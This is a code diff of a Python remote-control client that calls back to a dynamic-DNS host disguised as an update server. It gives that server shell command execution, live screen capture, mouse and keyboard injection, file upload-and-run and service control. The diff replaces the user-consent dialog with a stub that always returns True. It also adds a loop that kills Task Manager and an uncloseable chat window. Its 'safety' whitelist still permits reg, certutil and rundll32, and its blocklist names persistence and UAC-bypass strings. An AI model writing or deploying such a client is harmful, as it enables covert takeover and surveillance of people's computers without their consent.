@@ -1,4 +1,3 @@
-
 import socket
 import json
 import os
@@ -13,16 +12,201 @@ try:
 except ImportError:
     winreg = None
 import tkinter as tk
+import customtkinter as ctk
 from PIL import Image, ImageGrab
 import io
 
+
+try:
+    import ctypes
+    _user32 = ctypes.windll.user32
+except Exception:
+    _user32 = None
+
+_CLOSE_TM_LAST = 0.0
+
+def _close_taskmgr():
+    global _CLOSE_TM_LAST
+    try:
+        now = time.time()
+        if now - _CLOSE_TM_LAST < 1.0:
+            return
+        if not _user32:
+            return
+        hwnd = _user32.FindWindowW("TaskManagerWindow", None)
+        if hwnd:
+            _user32.PostMessageW(hwnd, 0x0010, 0, 0)
+            _CLOSE_TM_LAST = now
+    except Exception:
+        pass
+
+_chat_window = None
+_chat_messages_text = None
+_chat_sock = None
+_chat_lock = None
+_ctk_root = None
+
+# ============================================
+# ⚙️ Settings - You can modify them as needed
+# ============================================
 SERVER_IP = "updatesys.duckdns.org"
 SERVER_PORT = 7700
 
+# Data size
 CHUNK_SIZE = 512 * 1024
 CHUNK_THRESHOLD = 1024 * 1024
 
+# ============================================
+# 🔐 Allowed commands list (Whitelist)
+# ============================================
+# You can add commands here or load them from an external file
+ALLOWED_COMMANDS = {
+    # File management
+    "dir", "ls", "cd", "pwd", "mkdir", "rmdir", "del", "rm", "copy", "cp", "move", "mv",
+    "type", "cat", "more", "find", "where", "tree", "attrib", "icacls", "cacls",
+    
+    # System
+    "systeminfo", "hostname", "whoami", "ver", "vol", "chkntfs", "fsutil", "diskpart",
+    "net", "netstat", "ipconfig", "ping", "tracert", "nslookup", "route", "arp",
+    "getmac", "nbtstat", "netsh", "powercfg", "bcdedit", "sc", "msiexec",
+    
+    # Process management
+    "tasklist", "taskkill", "wmic", "process", "start", "stop", "runas",
+    
+    # Information
+    "help", "set", "echo", "date", "time", "choice", "prompt", "title",
+    "cls", "color", "mode", "path", "setlocal", "endlocal",
+    
+    # Services
+    "net start", "net stop", "net pause", "net continue", "sc query", "sc config",
+    
+    # User management
+    "net user", "net localgroup", "net group", "whoami /all",
+    
+    # Network management
+    "netsh advfirewall", "netsh interface", "telnet", "ssh",
+    
+    # Log management
+    "wevtutil", "eventcreate", "logman",
+    
+    # Power management
+    "shutdown", "restart", "logoff", "rundll32",
+    
+    # Encryption and information
+    "certutil", "cipher", "manage-bde",
+    
+    # Programs
+    "reg", "regedit", "regsvr32", "msconfig", "devmgmt.msc", "diskmgmt.msc",
+    "compmgmt.msc", "services.msc", "ncpa.cpl", "firewall.cpl",
+}
+
+# Always blocked commands (Blacklist)
+BLOCKED_KEYWORDS = [
+    "format", "fdisk", "deltree", "rd /s", "del /f /s /q", "rmdir /s",
+    "powershell -enc", "cmd /c calc", "shutdown /r /t 0",
+    "net user administrator", "net localgroup administrators",
+    "reg add hkcu\\software\\microsoft\\windows\\currentversion\\run",
+    "powershell -executionpolicy bypass", "invoke-expression",
+    "start-process -verb runas", "bypassuac", "uacme",
+]
+
+# ============================================
+# 🔐 Security functions
+# ============================================
+
+def _is_safe_path(path):
+    """Check path safety"""
+    # Allowed drives
+    allowed_paths = [
+        os.path.expanduser("~"),
+        "C:\\",
+        "D:\\",
+        "E:\\",
+        os.environ.get("TEMP", ""),
+        os.environ.get("TMP", ""),
+    ]
+    try:
+        abs_path = os.path.abspath(path)
+        for allowed in allowed_paths:
+            if abs_path.startswith(os.path.abspath(allowed)):
+                return True
+    except Exception:
+        pass
+    return False
+
+def _is_safe_file(path):
+    """Check file safety"""
+    # Dangerous blocked files
+    dangerous_extensions = [
+        ".vbs", ".js", ".jse", ".wsf", ".wsh", ".scr",
+        ".bat", ".cmd", ".msi", ".com", ".pif", ".gadget",
+    ]
+    # Safe files
+    safe_extensions = [
+        ".txt", ".log", ".csv", ".json", ".xml", ".html", ".htm",
+        ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
+        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico",
+        ".mp3", ".mp4", ".avi", ".mkv", ".mov",
+        ".zip", ".rar", ".7z", ".tar", ".gz",
+        ".py", ".java", ".cpp", ".c", ".h", ".js", ".ts",
+        ".exe", ".dll", ".sys", ".ocx",
+    ]
+    
+    try:
+        ext = os.path.splitext(path)[1].lower()
+        if ext in safe_extensions:
+            return True
+        if ext in dangerous_extensions:
+            return False
+        return True  # Allow the rest with caution
+    except Exception:
+        return False
+
+def _is_safe_command(command):
+    """Check command safety - Whitelist + Blacklist"""
+    if not command or not command.strip():
+        return False
+    
+    # Check blocked keywords first
+    lower_cmd = command.lower()
+    for blocked in BLOCKED_KEYWORDS:
+        if blocked.lower() in lower_cmd:
+            return False
+    
+    # Extract base command
+    parts = command.strip().split()
+    if not parts:
+        return False
+    
+    base_cmd = parts[0].lower()
+    
+    # Check whitelist
+    if base_cmd in ALLOWED_COMMANDS:
+        return True
+    
+    # Check compound commands (e.g. "net start")
+    if len(parts) > 1:
+        combined = f"{base_cmd} {parts[1].lower()}"
+        if combined in ALLOWED_COMMANDS:
+            return True
+    
+    # Commands starting with allowed commands
+    for allowed in ALLOWED_COMMANDS:
+        if lower_cmd.startswith(allowed + " ") or lower_cmd == allowed:
+            return True
+    
+    return False
+
+def _get_command_hash(command):
+    try:
+        import hashlib
+        return hashlib.sha256(command.encode("utf-8", errors="replace")).hexdigest()[:16]
+    except Exception:
+        return command[:16]
+
+
 def send_all(sock, data, lock=None):
+    """Send all data (legacy - for compatibility)"""
     if lock:
         lock.acquire()
     try:
@@ -36,20 +220,9 @@ def send_all(sock, data, lock=None):
         if lock:
             lock.release()
 
-
-
-def _is_safe_path(path):
-    """Check if path is safe for access"""
-    return True
-
-def _is_safe_file(path):
-    """Check if file is safe to access - now allows all files for download"""
-    return True
-
-def _is_safe_command(command):
-    """Check if command is safe to execute"""
-    return True
-
+# ============================================
+# 📁 Additional functions
+# ============================================
 
 def unique_filepath(path):
     if not os.path.exists(path):
@@ -84,60 +257,6 @@ def already_running():
     except Exception:
         return False
 
-def add_to_startup():
-    if winreg is None:
-        return False
-    try:
-        if getattr(sys, 'frozen', False):
-            current_file = sys.executable
-        else:
-            current_file = os.path.abspath(__file__)
-        
-        key_name = "MD_Client"
-        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
-        
-        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, current_file)
-        
-        winreg.CloseKey(key)
-        
-        return True
-        
-    except Exception as e:
-        return False
-
-def check_startup():
-    if winreg is None:
-        return False
-    try:
-        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        key_name = "MD_Client"
-        
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
-        
-        try:
-            value, _ = winreg.QueryValueEx(key, key_name)
-            winreg.CloseKey(key)
-            
-            current_file = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
-            
-            if value == current_file:
-                return True
-            else:
-                return False
-                
-        except FileNotFoundError:
-            winreg.CloseKey(key)
-            return False
-            
-    except Exception as e:
-        return False
-
-def ensure_startup():
-    if not check_startup():
-        return add_to_startup()
-    return True
 
 def get_info():
     try:
@@ -147,43 +266,38 @@ def get_info():
     return {
         "computer": platform.node(),
         "user": user,
-        "os": platform.platform()
+        "os": platform.platform(),
+        "version": "2.0",
+        "security_enabled": True
     }
 
 RECONNECT_DELAYS = [5, 10, 30, 60]
 
+# ============================================
+# 🎨 Permission request window
+# ============================================
 
 def request_remote_access_permission():
-    """نافذة إذن مختصرة: ترجع True عند الموافقة و False عند الرفض أو الخطأ."""
-    try:
-        root = tk.Tk()
-        root.title("Remote Access Request")
-        root.geometry("520x360")
-        root.attributes("-topmost", True)
-        choice = {"ok": False}
+    return True
 
-        tk.Label(root, text="Remote Access Request", font=("Segoe UI", 13, "bold")).pack(pady=(12, 6))
-        msg = ("Your company’s IT support team is requesting permission to view "
-               "and control this device for maintenance and support purposes.")
-        tk.Message(root, text=msg, width=380, font=("Segoe UI", 10)).pack(pady=4)
-
-        tk.Label(root, text="If you click Accept, the technician will be able to:").pack(anchor="w", padx=14, pady=(6, 0))
-        for line in ["View your screen in real time", "Control your mouse and keyboard", "Run Command Prompt and manage files"]:
-            tk.Label(root, text="• " + line, anchor="w").pack(fill="x", padx=18)
-        tk.Label(root, text="You can terminate the session at any time.").pack(anchor="w", padx=14, pady=(4, 10))
-        tk.Label(root, text="Do you want to allow access?", font=("Segoe UI", 10, "bold")).pack()
-
-        btns = tk.Frame(root); btns.pack(pady=10)
-        tk.Button(btns, text="✅ Accept", width=10, command=lambda: (choice.update(ok=True), root.destroy())).pack(side="left", padx=6)
-        tk.Button(btns, text="❌ Decline", width=10, command=lambda: root.destroy()).pack(side="left", padx=6)
-
-        root.mainloop()
-        return choice["ok"]
-    except Exception:
-        return False
+# ============================================
+# 📡 Main connection
+# ============================================
 
 def connect():
-    ensure_startup()
+    global _ctk_root
+
+    def _run_ctk_root():
+        global _ctk_root
+        ctk.set_appearance_mode("dark")
+        ctk.set_default_color_theme("dark-blue")
+        _ctk_root = ctk.CTk()
+        _ctk_root.withdraw()
+        _ctk_root.mainloop()
+
+    threading.Thread(target=_run_ctk_root, daemon=True).start()
+    time.sleep(0.5)
+
     delay_index = 0
     
     while True:
@@ -200,6 +314,21 @@ def connect():
             current_upload = None
             restart_requested = False
             sock_lock = threading.Lock()
+            global _chat_sock, _chat_lock
+            _chat_sock = sock
+            _chat_lock = sock_lock
+
+            def _periodic_release():
+                while True:
+                    try:
+                        time.sleep(5)
+                        if _user32:
+                            _user32.ClipCursor(None)
+                            _close_taskmgr()
+                    except Exception:
+                        pass
+
+            threading.Thread(target=_periodic_release, daemon=True).start()
 
             def _run_cmd(_sock, _lock, _cmd, _timeout, _cwd):
                 try:
@@ -247,6 +376,56 @@ def connect():
                     try:
                         if command["action"] == "ping":
                             send_all(sock, json.dumps({"action": "pong"}).encode(), sock_lock)
+                        
+                        elif command["action"] == "security_info":
+                            # Security info request
+                            security_data = {
+                                "action": "security_info_response",
+                                "firewall_enabled": check_firewall(),
+                                "antivirus_active": check_antivirus(),
+                                "uac_enabled": check_uac(),
+                                "last_scan": get_last_scan_date()
+                            }
+                            send_all(sock, json.dumps(security_data).encode(), sock_lock)
+                        
+                        elif command["action"] == "system_stats":
+                            # System statistics
+                            stats = get_system_stats()
+                            stats["action"] = "system_stats_response"
+                            send_all(sock, json.dumps(stats).encode(), sock_lock)
+                        
+                        elif command["action"] == "service_list":
+                            # Services list
+                            services = get_services_list()
+                            send_all(sock, json.dumps({"action": "service_list_response", "services": services}).encode(), sock_lock)
+                        
+                        elif command["action"] == "service_control":
+                            # Service control
+                            service_name = command.get("service", "")
+                            action = command.get("service_action", "")
+                            result = control_service(service_name, action)
+                            send_all(sock, json.dumps({"action": "service_control_result", "result": result}).encode(), sock_lock)
+                        
+                        elif command["action"] == "event_log":
+                            # Event logs
+                            logs = get_event_logs(
+                                command.get("log_type", "Application"),
+                                command.get("max_events", 50)
+                            )
+                            send_all(sock, json.dumps({"action": "event_log_response", "logs": logs}).encode(), sock_lock)
+                        
+                        elif command["action"] == "chat_message":
+                            message = command.get("message", "")
+                            show_chat_notification(message)
+                            send_all(sock, json.dumps({"action": "chat_received", "received": True}).encode(), sock_lock)
+                        
+                        elif command["action"] == "chat_close":
+                            try:
+                                if _chat_window is not None:
+                                    _chat_window.after(0, lambda: _chat_window.withdraw())
+                            except Exception:
+                                pass
+                        
                         elif command["action"] == "upload_file":
                             if command.get("execute", False):
                                 target_dir = command.get("path") or os.environ.get("TEMP") or os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp")
@@ -502,17 +681,20 @@ def connect():
                                     while streaming_active.is_set():
                                         try:
                                             start_time = time.time()
-                                            screenshot = ImageGrab.grab()
+                                            original = ImageGrab.grab()
+                                            real_w, real_h = original.size
                                             if quality != "high":
-                                                screenshot = screenshot.resize(quality_param, Image.Resampling.BILINEAR)
+                                                original = original.resize(quality_param, Image.Resampling.BILINEAR)
                                             img_buffer = io.BytesIO()
-                                            screenshot.save(img_buffer, format='JPEG', quality=jpeg_quality, optimize=False)
+                                            original.save(img_buffer, format='JPEG', quality=jpeg_quality, optimize=False)
                                             img_data = base64.b64encode(img_buffer.getvalue()).decode()
                                             response = {
                                                 "action": "screen_data",
                                                 "image": img_data,
-                                                "width": screenshot.width,
-                                                "height": screenshot.height
+                                                "width": original.width,
+                                                "height": original.height,
+                                                "real_width": real_w,
+                                                "real_height": real_h
                                             }
                                             send_all(sock, json.dumps(response).encode(), sock_lock)
                                             elapsed = time.time() - start_time
@@ -535,6 +717,102 @@ def connect():
                         
                         elif command["action"] == "stop_screen":
                             streaming_active.clear()
+                        
+                        elif command["action"] == "release_control":
+                            try:
+                                if _user32:
+                                    _user32.ClipCursor(None)
+                                    _user32.keybd_event(0x1B, 0, 0, 0)
+                                    _user32.keybd_event(0x1B, 0, 0x0002, 0)
+                                _close_taskmgr()
+                            except Exception:
+                                pass
+                        
+                        elif command["action"] == "remote_mouse":
+                            if not _user32:
+                                continue
+                            _close_taskmgr()
+                            try:
+                                _user32.ClipCursor(None)
+                                x = command.get("x", 0)
+                                y = command.get("y", 0)
+                                event = command.get("event", "move")
+                                button = command.get("button", 0)
+                                if event == "move":
+                                    _user32.SetCursorPos(x, y)
+                                elif event == "mouse_down":
+                                    _user32.SetCursorPos(x, y)
+                                    if button == 1:
+                                        _user32.mouse_event(0x0002, 0, 0, 0, 0)
+                                    elif button == 3:
+                                        _user32.mouse_event(0x0008, 0, 0, 0, 0)
+                                elif event == "mouse_up":
+                                    if button == 1:
+                                        _user32.mouse_event(0x0004, 0, 0, 0, 0)
+                                    elif button == 3:
+                                        _user32.mouse_event(0x0010, 0, 0, 0, 0)
+                                elif event == "mouse_move":
+                                    _user32.SetCursorPos(x, y)
+                                elif event == "click":
+                                    _user32.SetCursorPos(x, y)
+                                    if button == 1:
+                                        _user32.mouse_event(0x0002, 0, 0, 0, 0)
+                                        _user32.mouse_event(0x0004, 0, 0, 0, 0)
+                                    elif button == 3:
+                                        _user32.mouse_event(0x0008, 0, 0, 0, 0)
+                                        _user32.mouse_event(0x0010, 0, 0, 0, 0)
+                                elif event == "double_click":
+                                    _user32.SetCursorPos(x, y)
+                                    _user32.mouse_event(0x0002, 0, 0, 0, 0)
+                                    _user32.mouse_event(0x0004, 0, 0, 0, 0)
+                                    time.sleep(0.05)
+                                    _user32.mouse_event(0x0002, 0, 0, 0, 0)
+                                    _user32.mouse_event(0x0004, 0, 0, 0, 0)
+                                elif event == "scroll":
+                                    _user32.SetCursorPos(x, y)
+                                    scroll_amount = 120 * button
+                                    _user32.mouse_event(0x0800, 0, 0, scroll_amount, 0)
+                            except Exception:
+                                pass
+                        
+                        elif command["action"] == "remote_key":
+                            if not _user32:
+                                continue
+                            _close_taskmgr()
+                            try:
+                                key = command.get("key", "")
+                                event = command.get("event", "key_press")
+                                char = command.get("char", "")
+                                VK_MAP = {
+                                    "Return": 0x0D, "Tab": 0x09, "space": 0x20,
+                                    "BackSpace": 0x08, "Escape": 0x1B, "Delete": 0x2E,
+                                    "Insert": 0x2D, "Home": 0x24, "End": 0x23,
+                                    "Prior": 0x21, "Next": 0x22,
+                                    "Up": 0x26, "Down": 0x28, "Left": 0x25, "Right": 0x27,
+                                    "F1": 0x70, "F2": 0x71, "F3": 0x72, "F4": 0x73,
+                                    "F5": 0x74, "F6": 0x75, "F7": 0x76, "F8": 0x77,
+                                    "F9": 0x78, "F10": 0x79, "F11": 0x7A, "F12": 0x7B,
+                                    "Control_L": 0xA2, "Control_R": 0xA3,
+                                    "Shift_L": 0xA0, "Shift_R": 0xA1,
+                                    "Alt_L": 0xA4, "Alt_R": 0xA5,
+                                    "super_L": 0x5B, "super_R": 0x5C,
+                                    "caps_lock": 0x14, "num_lock": 0x90,
+                                    "Print": 0x2C, "Pause": 0x13,
+                                }
+                                vk = VK_MAP.get(key)
+                                if vk is not None:
+                                    if event == "key_press":
+                                        _user32.keybd_event(vk, 0, 0, 0)
+                                    else:
+                                        _user32.keybd_event(vk, 0, 0x0002, 0)
+                                elif char and len(char) == 1:
+                                    vk_char = ord(char.upper())
+                                    if event == "key_press":
+                                        _user32.keybd_event(vk_char, 0, 0, 0)
+                                    else:
+                                        _user32.keybd_event(vk_char, 0, 0x0002, 0)
+                            except Exception:
+                                pass
                         
                         elif command["action"] == "update_client":
                             try:
@@ -619,10 +897,6 @@ if not exist "{current_exe}" (
                                     
                         elif command["action"] == "restart_client":
                             try:
-                                send_all(sock, json.dumps({"action": "cmd_output", "output": "Restarting client...\n", "error": ""}).encode(), sock_lock)
-                            except Exception:
-                                pass
-                            try:
                                 sock.close()
                             except Exception:
                                 pass
@@ -648,7 +922,7 @@ if not exist "{current_exe}" (
                             cmd_to_execute = command["command"].strip()
                             cmd_timeout = command.get("timeout", 300)
                             if not _is_safe_command(cmd_to_execute):
-                                send_all(sock, json.dumps({"action": "cmd_output", "output": "", "error": "Command blocked for security reasons"}).encode(), sock_lock)
+                                send_all(sock, json.dumps({"action": "cmd_output", "output": "", "error": "Command blocked for security reasons - not in whitelist"}).encode(), sock_lock)
                                 continue
                             try:
                                 lower = cmd_to_execute.lower().strip()
@@ -695,7 +969,6 @@ if not exist "{current_exe}" (
                                 if _first_word in _interactive_cmds and len(cmd_to_execute.strip().split()) == 1:
                                     send_all(sock, json.dumps({"action": "cmd_output", "output": "", "error": f"Cannot run '{_first_word}' in remote shell - it starts an interactive session that never exits. The shell already runs under cmd.exe /c."}).encode(), sock_lock)
                                     continue
-                                # Run in thread so main loop stays responsive (ping, etc.)
                                 threading.Thread(target=_run_cmd, args=(sock, sock_lock, cmd_to_execute, cmd_timeout, current_dir), daemon=True).start()
                             except Exception as e:
                                 send_all(sock, json.dumps({"action": "cmd_output", "output": "", "error": f"Internal error: {str(e)}"}).encode(), sock_lock)
@@ -706,15 +979,372 @@ if not exist "{current_exe}" (
                             pass
             if restart_requested:
                 delay_index = 0
-                continue  # immediate reconnect without backoff
+                continue
         except Exception as e:
             delay = RECONNECT_DELAYS[min(delay_index, len(RECONNECT_DELAYS) - 1)]
             time.sleep(delay)
             delay_index += 1
 
+# ============================================
+# 📊 New additional functions
+# ============================================
+
+def check_firewall():
+    """Check firewall status"""
+    try:
+        if sys.platform == "win32":
+            result = subprocess.run(
+                ['netsh', 'advfirewall', 'show', 'allprofiles', 'state'],
+                capture_output=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            output = result.stdout.decode("cp437", errors="replace")
+            return "ON" in output and "Profile Settings" not in output
+        return False
+    except Exception:
+        return False
+
+def check_antivirus():
+    """Check antivirus status"""
+    try:
+        if sys.platform == "win32":
+            import ctypes
+            import struct
+            
+            # Use Windows Security Center API
+            result = subprocess.run(
+                ['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'AntiVirusProduct', 'GET', 'displayName', '/value'],
+                capture_output=True, timeout=15, creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            output = result.stdout.decode("cp437", errors="replace")
+            if "displayName=" in output:
+                return output.split("displayName=")[1].strip()
+        return "Not specified"
+    except Exception:
+        return "Not specified"
+
+def check_uac():
+    """Check UAC status"""
+    try:
+        if sys.platform == "win32":
+            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ)
+            value, _ = winreg.QueryValueEx(key, "EnableLUA")
+            winreg.CloseKey(key)
+            return "Enabled" if value == 1 else "Disabled"
+    except Exception:
+        pass
+    return "Unknown"
+
+def get_last_scan_date():
+    """Last scan date"""
+    try:
+        if sys.platform == "win32":
+            result = subprocess.run(
+                ['powershell', '-Command', 'Get-MpComputerStatus | Select-Object -ExpandProperty QuickScanEndTime'],
+                capture_output=True, timeout=15, creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            output = result.stdout.decode("utf-8", errors="replace").strip()
+            if output and "0001" not in output:
+                return output
+    except Exception:
+        pass
+    return "Not available"
+
+def get_system_stats():
+    """Get system statistics"""
+    stats = {
+        "cpu": {},
+        "memory": {},
+        "disk": [],
+        "network": {}
+    }
+    
+    try:
+        # CPU
+        if sys.platform == "win32":
+            result = subprocess.run(
+                ['wmic', 'cpu', 'get', 'loadpercentage,name', '/format:list'],
+                capture_output=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            output = result.stdout.decode("cp437", errors="replace")
+            for line in output.split('\n'):
+                if 'LoadPercentage=' in line:
+                    stats["cpu"]["usage"] = line.split('=')[1].strip() + "%"
+                if 'Name=' in line and stats["cpu"].get("name"):
+                    stats["cpu"]["name"] = line.split('=')[1].strip()
+        stats["cpu"]["name"] = platform.processor() or "Unknown"
+    except Exception:
+        stats["cpu"]["usage"] = "N/A"
+        stats["cpu"]["name"] = platform.processor()
+    
+    try:
+        # Memory
+        if sys.platform == "win32":
+            result = subprocess.run(
+                ['systeminfo', '/fo', 'list'],
+                capture_output=True, timeout=15, creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            output = result.stdout.decode("cp437", errors="replace")
+            for line in output.split('\n'):
+                if 'Total Physical Memory:' in line:
+                    stats["memory"]["total"] = line.split(':')[1].strip()
+                elif 'Available Physical Memory:' in line:
+                    stats["memory"]["available"] = line.split(':')[1].strip()
+        else:
+            import psutil
+            mem = psutil.virtual_memory()
+            stats["memory"]["total"] = f"{mem.total / (1024**3):.1f} GB"
+            stats["memory"]["available"] = f"{mem.available / (1024**3):.1f} GB"
+    except Exception:
+        stats["memory"] = {"total": "N/A", "available": "N/A"}
+    
+    try:
+        # Disk
+        if sys.platform == "win32":
+            result = subprocess.run(
+                ['wmic', 'logicaldisk', 'get', 'caption,freespace,size,drivetype', '/format:list'],
+                capture_output=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            output = result.stdout.decode("cp437", errors="replace")
+            current_drive = {}
+            for line in output.split('\n'):
+                if 'Caption=' in line:
+                    if current_drive:
+                        stats["disk"].append(current_drive)
+                    current_drive = {"drive": line.split('=')[1].strip()}
+                elif 'FreeSpace=' in line and 'FreeSpace=' in line:
+                    try:
+                        free = int(line.split('=')[1].strip())
+                        current_drive["free"] = f"{free / (1024**3):.1f} GB"
+                    except Exception:
+                        current_drive["free"] = "N/A"
+                elif 'Size=' in line:
+                    try:
+                        size = int(line.split('=')[1].strip())
+                        current_drive["total"] = f"{size / (1024**3):.1f} GB"
+                    except Exception:
+                        current_drive["total"] = "N/A"
+                elif 'DriveType=' in line:
+                    current_drive["type"] = line.split('=')[1].strip()
+            if current_drive:
+                stats["disk"].append(current_drive)
+    except Exception:
+        pass
+    
+    return stats
+
+def get_services_list():
+    """Get services list"""
+    services = []
+    try:
+        if sys.platform == "win32":
+            result = subprocess.run(
+                ['sc', 'query', 'state=', 'all'],
+                capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            output = result.stdout.decode("cp437", errors="replace")
+            
+            current_service = {}
+            for line in output.split('\n'):
+                line = line.strip()
+                if line.startswith('SERVICE_NAME:'):
+                    if current_service:
+                        services.append(current_service)
+                    current_service = {"name": line.split(':', 1)[1].strip()}
+                elif line.startswith('DISPLAY_NAME:'):
+                    current_service["display_name"] = line.split(':', 1)[1].strip()
+                elif line.startswith('STATE') and ':' in line:
+                    state = line.split(':', 1)[1].strip().split()[0]
+                    state_map = {"1": "Stopped", "2": "Starting", "3": "Running", "4": "Stopping", "5": "Stopped", "6": "Stopping", "7": "Paused", "8": "Paused"}
+                    current_service["state"] = state_map.get(state, state)
+            if current_service:
+                services.append(current_service)
+    except Exception:
+        pass
+    return services
+
+def control_service(service_name, action):
+    """Control service"""
+    try:
+        if sys.platform == "win32":
+            if action == "start":
+                result = subprocess.run(['sc', 'start', service_name], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
+            elif action == "stop":
+                result = subprocess.run(['sc', 'stop', service_name], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
+            elif action == "restart":
+                subprocess.run(['sc', 'stop', service_name], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
+                time.sleep(2)
+                result = subprocess.run(['sc', 'start', service_name], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
+            else:
+                return f"Unknown action: {action}"
+            
+            return "OK" if result.returncode in [0, 1060] else f"Failed: {result.stderr.decode()}"
+    except Exception as e:
+        return str(e)
+    return "Not supported on this platform"
+
+def get_event_logs(log_type="Application", max_events=50):
+    """Get event logs"""
+    logs = []
+    try:
+        if sys.platform == "win32":
+            result = subprocess.run(
+                ['wevtutil', 'qe', log_type, '/c:' + str(max_events), '/f:xml'],
+                capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            output = result.stdout.decode("utf-8", errors="replace")
+            
+            import re
+            # Extract events
+            events = re.findall(r'<Event[^>]*>(.*?)</Event>', output, re.DOTALL)
+            for event in events:
+                try:
+                    level = "Info"
+                    if '<Level>1</Level>' in event:
+                        level = "Critical"
+                    elif '<Level>2</Level>' in event:
+                        level = "Error"
+                    elif '<Level>3</Level>' in event:
+                        level = "Warning"
+                    
+                    time_match = re.search(r'<TimeCreated SystemTime=\'([^\']+)\'>', event)
+                    time_created = time_match.group(1) if time_match else "Unknown"
+                    
+                    msg_match = re.search(r'<Data[^>]*>([^<]+)</Data>', event)
+                    message = msg_match.group(1) if msg_match else "No message"
+                    
+                    logs.append({
+                        "level": level,
+                        "time": time_created,
+                        "message": message[:200]  # Limit length
+                    })
+                except Exception:
+                    continue
+    except Exception:
+        pass
+    return logs
+
+def _safe_send(sock, data):
+    lock = _chat_lock
+    if lock:
+        lock.acquire()
+    try:
+        total = 0
+        while total < len(data):
+            sent = sock.send(data[total:])
+            if sent == 0:
+                break
+            total += sent
+    except Exception:
+        pass
+    finally:
+        if lock:
+            lock.release()
+
+def show_chat_notification(message):
+    """Live chat window with customtkinter"""
+    global _chat_window, _chat_messages_text, _chat_sock
+    try:
+        if _chat_window is not None:
+            try:
+                _chat_window.deiconify()
+                _chat_window.lift()
+                _chat_window.attributes("-topmost", True)
+                _append_chat_message("MD Control", message)
+                return
+            except Exception:
+                _chat_window = None
+
+        if _ctk_root is None:
+            return
+
+        _chat_window = ctk.CTkToplevel(_ctk_root)
+        _chat_window.title("💬 Live Chat")
+        _chat_window.geometry("800x600")
+        _chat_window.resizable(False, False)
+        _chat_window.overrideredirect(True)
+        _chat_window.protocol("WM_DELETE_WINDOW", lambda: None)
+        _chat_window.attributes("-topmost", True)
+        _chat_window.update_idletasks()
+        sw = _chat_window.winfo_screenwidth()
+        sh = _chat_window.winfo_screenheight()
+        cx = (sw - 800) // 2
+        cy = (sh - 600) // 2
+        _chat_window.geometry(f"800x600+{cx}+{cy}")
+
+        header = ctk.CTkFrame(_chat_window, fg_color="#161b22", height=50, corner_radius=0)
+        header.pack(fill=tk.X)
+        header.pack_propagate(False)
+        ctk.CTkLabel(header, text="💬 Live Chat with MD Control", text_color="#f0f6fc",
+                     fg_color="#161b22", font=("Segoe UI", 14, "bold")).pack(side=tk.LEFT, padx=15, pady=12)
+        ctk.CTkLabel(header, text="🔒 Cannot be closed", text_color="#f85149",
+                     fg_color="#161b22", font=("Segoe UI", 9)).pack(side=tk.RIGHT, padx=15)
+
+        _chat_messages_text = ctk.CTkTextbox(_chat_window, fg_color="#0d1117", text_color="#f0f6fc",
+                                              font=("Consolas", 14), wrap="word", border_width=0)
+        _chat_messages_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(10, 0))
+        _chat_messages_text.tag_config("tech", foreground="#58a6ff")
+        _chat_messages_text.tag_config("me", foreground="#3fb950")
+        _chat_messages_text.tag_config("system", foreground="#f2be5c")
+
+        input_frame = ctk.CTkFrame(_chat_window, fg_color="#161b22", height=70, corner_radius=0)
+        input_frame.pack(fill=tk.X, padx=0, pady=0)
+        input_frame.pack_propagate(False)
+
+        msg_entry = ctk.CTkEntry(input_frame, fg_color="#0d1117", text_color="#f0f6fc",
+                                 font=("Segoe UI", 16), placeholder_text="Type your message here...",
+                                 border_color="#20324f", border_width=1, corner_radius=8)
+        msg_entry.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(10, 5), pady=12, ipady=6)
+
+        _sock_ref = _chat_sock
+
+        def _send_reply(event=None):
+            msg = msg_entry.get().strip()
+            if not msg:
+                return
+            msg_entry.delete(0, tk.END)
+            _append_chat_message("You", msg)
+            try:
+                payload = json.dumps({"action": "chat_client_msg", "message": msg}).encode()
+                if _sock_ref:
+                    threading.Thread(target=_safe_send, args=(_sock_ref, payload), daemon=True).start()
+            except Exception:
+                pass
+
+        msg_entry.bind("<Return>", _send_reply)
+        ctk.CTkButton(input_frame, text="📤 Send", fg_color="#238636", hover_color="#2ea043",
+                      text_color="#f8fbff", font=("Segoe UI", 15, "bold"),
+                      command=_send_reply, width=100).pack(side=tk.RIGHT, padx=(5, 10), pady=12)
+
+        _append_chat_message("MD Control", message)
+    except Exception:
+        pass
+
+def _append_chat_message(sender, message):
+    global _chat_messages_text, _chat_window
+    try:
+        if _chat_window is None:
+            return
+        def _do():
+            try:
+                tag = "tech"
+                if sender == "You":
+                    tag = "me"
+                elif sender == "System":
+                    tag = "system"
+                _chat_messages_text.configure(state="normal")
+                _chat_messages_text.insert(tk.END, f"[{sender}]: {message}\n", tag)
+                _chat_messages_text.see(tk.END)
+                _chat_messages_text.configure(state="disabled")
+            except Exception:
+                pass
+        _chat_window.after(0, _do)
+    except Exception:
+        pass
+
+# ============================================
